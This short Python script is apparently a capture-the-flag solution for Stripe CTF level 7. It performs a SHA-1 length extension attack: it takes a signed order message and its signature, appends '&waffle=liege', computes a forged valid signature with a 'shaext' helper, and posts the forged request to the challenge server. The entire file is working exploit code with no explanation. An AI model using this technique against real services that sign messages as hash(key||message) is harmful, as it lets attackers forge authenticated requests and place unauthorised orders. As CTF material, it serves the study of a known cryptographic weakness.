#!/usr/bin/env python
#
# sha1 padding/length extension attack
# by rd@vnsecurity.net
#

import sys
import base64
import requests
from shaext import shaext

key = 'GHBD30wBR5DvjK'
keylen = len(key)
orig_msg = 'count=2&lat=37.351&user_id=1&long=-119.827&waffle=chicken' #< original message
orig_sig = '38ee18cd57e1ca3ba2c624b876afe9ea41a8b45c'   #< original hash
add_msg = '&waffle=liege'

ext = shaext(orig_msg, keylen, orig_sig)
ext.add(add_msg)

(new_msg, new_sig) = ext.final()

body = "%s|sig:%s" % (new_msg, new_sig)
print "\nBODY: %s" % body
resp = requests.post('https://level07-2.stripe-ctf.com/user-ghybbfhkqk/orders', data=body)
#resp = requests.post('http://localhost:9233/orders', data=body)
print resp.text
